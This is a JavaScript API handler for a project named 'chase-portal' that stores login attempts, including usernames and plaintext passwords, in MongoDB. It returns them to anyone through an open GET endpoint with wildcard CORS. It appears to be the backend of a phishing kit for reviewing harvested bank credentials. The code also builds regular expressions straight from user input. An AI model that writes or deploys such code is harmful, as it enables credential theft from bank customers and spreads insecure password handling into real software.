import mongoose from 'mongoose';

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chase-portal';

// Login Log Schema
const loginLogSchema = new mongoose.Schema({
  timestamp: { type: Date, default: Date.now, index: true },
  username: String,
  password: String,
  attemptNumber: Number,
  status: String,
  userAgent: String,
  ipAddress: String,
}, { collection: 'login_logs' });

const LoginLog = mongoose.model('LoginLog', loginLogSchema);

let dbConnected = false;
let connection = null;

async function connectDB() {
  if (connection) return connection;
  
  try {
    connection = await mongoose.connect(MONGODB_URI, {
      serverSelectionTimeoutMS: 5000,
      retryWrites: true,
      w: 'majority'
    });
    dbConnected = true;
    return connection;
  } catch (err) {
    console.warn('⚠️  MongoDB connection failed');
    dbConnected = false;
    return null;
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'GET') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  try {
    await connectDB();

    const { limit = 100, status, username } = req.query;
    let query = {};
    
    if (status) query.status = status;
    if (username) query.username = new RegExp(username, 'i');
    
    let logs = [];
    if (dbConnected) {
      logs = await LoginLog.find(query)
        .sort({ timestamp: -1 })
        .limit(parseInt(limit))
        .lean();
    }
    
    res.status(200).json({ 
      success: true, 
      count: logs.length, 
      logs, 
      source: dbConnected ? 'MongoDB' : 'No data',
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
}
